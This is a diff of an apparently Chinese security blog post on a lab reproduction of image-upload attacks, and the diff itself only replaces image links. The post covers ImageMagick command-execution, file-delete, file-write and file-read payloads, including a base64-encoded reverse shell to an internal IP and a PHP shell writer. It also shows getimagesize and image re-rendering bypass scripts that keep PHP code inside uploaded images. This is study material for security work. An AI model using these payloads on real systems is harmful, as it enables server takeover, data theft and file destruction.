@@ -106,7 +106,7 @@
       
 
       
-      <p><img src="/Users/time/hexo/source/img/81.jpg" alt="81"></p>
+      <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yay18u2j31hc0u04gu.jpg" alt="81"></p>
 <a id="more"></a>
 
 
@@ -115,42 +115,42 @@
 <p>漏洞原理可参考此链接：<a href="https://www.cnblogs.com/yang34/p/13653893.html" target="_blank" rel="noopener">https://www.cnblogs.com/yang34/p/13653893.html</a></p>
 <p>当然本文肯定不会是专门讲nginx解析漏洞，而是讲漏洞复现时发现的一个小问题点。本次漏洞复现使用了mkcms和74cms作为漏洞环境进行复现。</p>
 <p>下载phpstudy8.1.0.7版本。</p>
-<p><img src="Imageick/26.png" alt="image-20201113161730880"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybp6z8pj30ma0hi0v5.jpg" alt="image-20201113161730880"></p>
 <p>​    cms安装成功后，找到可上传图片点</p>
 <p>mkcms</p>
 <p>​    上传图片马</p>
-<p><img src="Imageick/28.png" alt="image-20201113163013507"></p>
-<p><img src="Imageick/29.png" alt="image-20201113163024628"></p>
-<p><img src="Imageick/30.png" alt="image-20201113163040801"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybnvy5qj31zl0u0tfc.jpg" alt="image-20201113163013507"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybdw6gjj31j50u0mzd.jpg" alt="image-20201113163024628"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yazxe89j318a0u0drc.jpg" alt="image-20201113163040801"></p>
 <p>解析成功。</p>
 <p>74cms：</p>
-<p><img src="Imageick/31.png" alt="image-20201113163104610"></p>
-<p><img src="Imageick/32.png" alt="image-20201113163123563"></p>
-<p><img src="Imageick/33.png" alt="image-20201113163142063"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybmhd4jj31580u043d.jpg" alt="image-20201113163104610"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yaw7hb7j318e0u0dhh.jpg" alt="image-20201113163123563"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb3b62ij32js0ri1ic.jpg" alt="image-20201113163142063"></p>
 <p>图片的确解析了，但是phpinfo没被解析。</p>
-<p><img src="Imageick/34.png" alt="img"></p>
-<p><img src="Imageick/27.png" alt="img"></p>
-<p><img src="Imageick/35.png" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybldnpjj30dw0dwwem.jpg" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb7iifyj3073073aa9.jpg" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb6uw4hj30dw0a4t92.jpg" alt="img"></p>
 <p>百思不得其解，度娘了一波，大致了解，图片上传时调用图片处理函数对图片进行了剪裁啥的然后重新生成了一张新的图片。而这种方法叫二次渲染。</p>
-<p><img src="Imageick/36.png" alt="快乐 啪！没了"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yax4oglj306o06o0sr.jpg" alt="快乐 啪！没了"></p>
 <p>作为菜逼的我代码也看不懂，只能跟着百度方法C32ASM一波了。</p>
 <p>mkcms，原图片和上传后图片的对比，阔以发现没得啥变化，怪不得可以执行成功。</p>
-<p><img src="Imageick/37.png" alt="image-20201113165910750"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybbpsakj31hw0u07wh.jpg" alt="image-20201113165910750"></p>
 <p>74cms，原图片和上传后图片对比，图片前面已经全部被修改了。。。</p>
-<p><img src="Imageick/38.png" alt="image-20201113170123875"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybd59qaj310m0u0nnf.jpg" alt="image-20201113170123875"></p>
 <p>尝试了n+++++久。。。。。。好像整个图片代码没得地方是不变的。</p>
-<p><img src="Imageick/39.png" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb17t5ej307307374i.jpg" alt="img"></p>
 <p>于是想对图片库这一块的漏洞好好学习一波，于是。。。就有了本篇文章。。。php常用图片库漏洞的利用和总结？</p>
 <h3 id="0x02-ImageMagick"><a href="#0x02-ImageMagick" class="headerlink" title="0x02 ImageMagick"></a>0x02 ImageMagick</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>ImageMagick是目前使用最广泛的开源图片处理工具，可读写处理图片类型超90种，支持多种编程语言，也可使用命令行对图片进行操作。Imagemagick在16年爆出命令执行漏洞及利用伪协议进行读取、删除、移动文件等漏洞。漏洞复现使用PHP调用imagemagick库来进行测试。关于漏洞的详细分析此处贴一个大佬的连接：<a href="https://wooyun.js.org/drops/CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">ImageMagick漏洞分析</a>，有兴趣的大佬可以看看。</p>
 <h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>Apache+php5.6</p>
 <p>Ubuntu18.04(更新之前去掉sources.list中deb-src注释)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt upgrade</span><br><span class="line">sudo apt build-dep imagemagick </span><br><span class="line"></span><br><span class="line">下载imagemagick漏洞版本(此处下载6.8.1作为演示)</span><br><span class="line">		源码下载地址：https:&#x2F;&#x2F;master.dl.sourceforge.net&#x2F;project&#x2F;imagemagick&#x2F;old-sources&#x2F;6.x&#x2F;</span><br><span class="line">		</span><br><span class="line">安装</span><br><span class="line">		tar -zxvf ImageMagick-6.8.1-10.tar.bz </span><br><span class="line">		cd ImageMagick-6.8.1-10</span><br><span class="line">		sudo .&#x2F;configure</span><br><span class="line">		make &amp;&amp; make install</span><br><span class="line">	查看是否安装成功</span><br><span class="line">		convert -version</span><br><span class="line">		sudo ldconfig &#x2F;usr&#x2F;local&#x2F;lib</span><br></pre></td></tr></table></figure>
 
-<p><img src="Imageick/1.png" alt="image-20201014104544133"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yaygx2tj314k06ctat.jpg" alt="image-20201014104544133"></p>
 <p>如上图，则安装成功。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装PHP扩展</span><br><span class="line">	apt install libmagick++-dev</span><br><span class="line">	apt install php—imagick</span><br><span class="line">重启后打印phpinfo 查看php-imageic是否添加成功</span><br></pre></td></tr></table></figure>
 
-<p><img src="Imageick/2.png" alt="image-20201014113400760"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yawld2rj31o80ry7g1.jpg" alt="image-20201014113400760"></p>
 <p>漏洞源码</p>
 <p>index.php</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Image Uploader<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Image Uploader<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"myimage"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        <span class="keyword">include</span>(<span class="string">'upload.php'</span>);</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -162,26 +162,26 @@
 <h5 id="CVE-2016-3714"><a href="#CVE-2016-3714" class="headerlink" title="CVE-2016-3714"></a>CVE-2016-3714</h5><p>命令执行漏洞</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">写入shell</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.1&#x2F;1.jpg&quot;|echo \&#39;&lt;?php phpinfo();?&gt;\&#39; &gt; shell.php&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line"></span><br><span class="line">反弹shell-poc</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.1&#x2F;oops.jpg&quot;|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIxMS41NS43Lzg4ODggMD4mMQ&#x3D;&#x3D; | base64 -d| bash&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
 
-<p><img src="Imageick/3.png" alt="image-20201018020511007"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb0sgigj30vi0e0wfx.jpg" alt="image-20201018020511007"></p>
 <p>当前网站目录下不存在上传的图片及生成的shell文件</p>
-<p><img src="Imageick/4.png" alt="image-20201018021030131"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yazekzij316b0u0n1m.jpg" alt="image-20201018021030131"></p>
 <p>上传image.png图片</p>
-<p><img src="Imageick/5.png" alt="image-20201018021104260"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb7vnrqj30zk0f2q4k.jpg" alt="image-20201018021104260"></p>
 <p>上传成功,访问shell.php</p>
-<p><img src="Imageick/5-6.png" alt="image-20201018021303134"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybcivoxj318i0u0an8.jpg" alt="image-20201018021303134"></p>
 <p>查看网站根目录</p>
-<p><img src="Imageick/24.png" alt="image-20201018021207651"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yaxi0jrj30yg0u0129.jpg" alt="image-20201018021207651"></p>
 <p>反弹shell同理，监听8888端口</p>
-<p><img src="Imageick/17.png" alt="image-20201019102927078"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yayyfnzj30x60jm0v6.jpg" alt="image-20201019102927078"></p>
 <p>反弹成功</p>
-<p><img src="Imageick/18.png" alt=""></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybopfe5j30qf0d70uz.jpg" alt=""></p>
 <h5 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h5><p>ImageMagick的“临时”伪协议可以删除文件，该协议在读取后删除文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#39;ephemeral:&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt&#39;</span><br><span class="line">popgraphic-context</span><br></pre></td></tr></table></figure>
 
 <p>漏洞利用：创建test.txt文件</p>
-<p><img src="Imageick/7.png" alt="image-20201018025102952"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb8875vj30yc04k0tw.jpg" alt="image-20201018025102952"></p>
 <p>图片上次成功后，test文件删除成功</p>
-<p><img src="Imageick/9.png" alt="image-20201018025243313"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybegrgij30z807itan.jpg" alt="image-20201018025243313"></p>
 <h5 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h5><p>此漏洞是利用ImageMagick中的msl协议读取xml的内容，并根据其内容来写入任意文件。</p>
 <p>image.png</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#39;msl:&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt&#39;</span><br><span class="line">popgraphic-context</span><br></pre></td></tr></table></figure>
@@ -190,22 +190,22 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">&lt;read filename&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#x2F;1.gif&quot; &#x2F;&gt;# File to be copied</span><br><span class="line">&lt;write filename&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;phpinfo.php&quot; &#x2F;&gt;# Destination location</span><br><span class="line">&lt;&#x2F;image&gt;</span><br></pre></td></tr></table></figure>
 
 <p>准备一张图片马</p>
-<p><img src="Imageick/19.png" alt="image-20201019105859157"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb29qc5j30jg03ldg8.jpg" alt="image-20201019105859157"></p>
 <p>写入成功</p>
-<p><img src="Imageick/20.png" alt="image-20201019105959018"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb6f1q4j30pz0oeaei.jpg" alt="image-20201019105959018"></p>
 <h5 id="CVE-2016-3717"><a href="#CVE-2016-3717" class="headerlink" title="CVE-2016-3717"></a>CVE-2016-3717</h5><p>本地文件读取漏洞，根据label协议，可以读取文件并生成一个文件截图</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#39;label:@&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
 
-<p><img src="Imageick/11.png" alt="image-20201019110440082"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybnhfmcj30ht071gme.jpg" alt="image-20201019110440082"></p>
 <p>上传image.png，passwd文件截图成功</p>
-<p><img src="Imageick/21.png" alt="image-20201019110553098"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybb3qbcj30kb0j1jun.jpg" alt="image-20201019110553098"></p>
 <h5 id="getimagesize-函数绕过"><a href="#getimagesize-函数绕过" class="headerlink" title="getimagesize()函数绕过"></a>getimagesize()函数绕过</h5><p>官方手册中对getimagesize说明:</p>
 <p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 <code>IMG</code> 标记中的 height/width 文本字符串。</p>
 <p>getimagesize函数是用来修复之前ImageMagick漏洞。在之前的POC中当图片大小为0,0 0,0触发漏洞，使用getImagesize函数限制图片格式后，之前爆出来的POC无法使用。如何绕过？P神大法好：<a href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html" target="_blank" rel="noopener">ImageMgaick邂逅getimagesize的那点事</a> 涉及到底层C实在是不懂，贴一下P神的详细分析文章，大佬们自行查看。</p>
 <p>POC</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg&quot;|&quot;&#96;id&#96;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">#define xlogo_width 200</span><br><span class="line">#define xlogo_height 200</span><br></pre></td></tr></table></figure>
 
-<p><img src="Imageick/25.png" alt="image-20201019114308851"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybeslmij30k906ztax.jpg" alt="image-20201019114308851"></p>
 <p>而在某些特定条件下，可以使用xbm格式也可以绕过getimagesize函数，由于无测试环境，直接上payload，将如下代码插入php中</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br><span class="line">&lt;?php echo &#39;test&#39;;?&gt;</span><br><span class="line">static char test_bits[] &#x3D; &#123;</span><br><span class="line">0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,</span><br><span class="line">0x00, 0x60 &#125;;</span><br></pre></td></tr></table></figure>
 
@@ -219,17 +219,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">以下三个函数类似，判断不同类型的图片文件，并且根据原图片生成新图片</span><br><span class="line">  imagecreatefromgif()	</span><br><span class="line">  imagecreatefromjpeg()</span><br><span class="line">  imagecreatefrompng()</span><br><span class="line"></span><br><span class="line">	cropImage()	&#x2F;&#x2F;imagick渲染函数</span><br></pre></td></tr></table></figure>
 
 <h5 id="GIF渲染绕过"><a href="#GIF渲染绕过" class="headerlink" title="GIF渲染绕过"></a>GIF渲染绕过</h5><p>渲染绕过就是将未渲染的图片和渲染后的图片进行对比，找到被渲染后但是未被更改的区域添加恶意代码，如下图：</p>
-<p><img src="Imageick/12.png" alt="image-20201019011253065"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb3ywnmj31d10u04qq.jpg" alt="image-20201019011253065"></p>
 <p>红框中是渲染后未被修改的区域，添加恶意代码</p>
-<p><img src="Imageick/13.png" alt="image-20201019011722049"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb4u0yoj326s0j2qoi.jpg" alt="image-20201019011722049"></p>
 <p>可以看见部分代码还是被删除了，但是大部分还是保留，我们继续找位置</p>
-<p><img src="Imageick/22.png" alt="image-20201019012243357"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybfaafij315i0eqgun.jpg" alt="image-20201019012243357"></p>
 <p>经过测试，将代码插入到即可如下图所示处即可</p>
-<p><img src="Imageick/14.png" alt="image-20201019015944302"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybltrsaj30yw0cun4c.jpg" alt="image-20201019015944302"></p>
 <p>上传成功,代码未删除</p>
-<p><img src="Imageick/15.png" alt="image-20201019020127169"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb2sj27j311y0rsh0c.jpg" alt="image-20201019020127169"></p>
 <p>而图片添加了部分代码后。。咳咳，不过不影响正常使用，长成啥样随意吧。。。</p>
-<p><img src="Imageick/16.png" alt="image-20201019020437719"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybmt3h9j30mm0dmwfq.jpg" alt="image-20201019020437719"></p>
 <h5 id="JPG渲染绕过"><a href="#JPG渲染绕过" class="headerlink" title="JPG渲染绕过"></a>JPG渲染绕过</h5><p>二次渲染绕过同理，通过对比文件内容插入代码，不过网上已有jpg图片渲染绕过的脚本，</p>
 <p>先将图片文件上传，然后将图片下载到本地，使用下面脚本处理后，重新上传图片即可</p>
 <p>脚本如下</p>
@@ -242,18 +242,18 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>将上面代码运行后会在同目录生成一个1.png，重新上传后打开，发现恶意代码未被删除，成功绕过。</p>
-<p><img src="Imageick/23.png" alt="image-20201022165908209"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybc2gu0j31h60nwthp.jpg" alt="image-20201022165908209"></p>
 <h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>关于二次渲染的绕过方法其实是可适用于大多数图片处理库，对渲染后未修改的部分进行修改即可，渲染的地方不同，可写入代码位置需自行调试。ImageMagick漏洞属于图片库本身存在的漏洞，所以不限于PHP，其他编程语言中若使用Imagemagick漏洞版本，利用方法同上。</p>
 <p>最后的最后，解析漏洞的复现当然是成功了。</p>
-<p><img src="Imageick/40.png" alt="img"></p>
-<p><img src="Imageick/41.png" alt="image-20201113171338508"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb8uiyqj30b40b4gm6.jpg" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb5vjigj31420u015f.jpg" alt="image-20201113171338508"></p>
 <p>看见红框框了吗？看见图片名称了吗？没看见？再看一次</p>
-<p><img src="Imageick/42.png" alt="image-20201113171422445"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0ybo8zilj31650u011w.jpg" alt="image-20201113171422445"></p>
 <p>简单明了的上传点上传成功后，成功解析。</p>
 <p>而前面为什么没解析的原因。。</p>
 <p>因为用的是第三方编辑器上传的，Kindeditor编辑器。。</p>
-<p><img src="Imageick/43.png" alt="image-20201113171628101"></p>
-<p><img src="Imageick/44.png" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb9tky1j31a00sywgo.jpg" alt="image-20201113171628101"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yb0c8smj30c80cg74u.jpg" alt="img"></p>
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-13</a></p>
 <p><a href="https://blog.csdn.net/Auuuuuuuu/article/details/89046184" target="_blank" rel="noopener">https://blog.csdn.net/Auuuuuuuu/article/details/89046184</a></p>
 <p><a href="https://wooyun.js.org/drops/CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90.html</a></p>
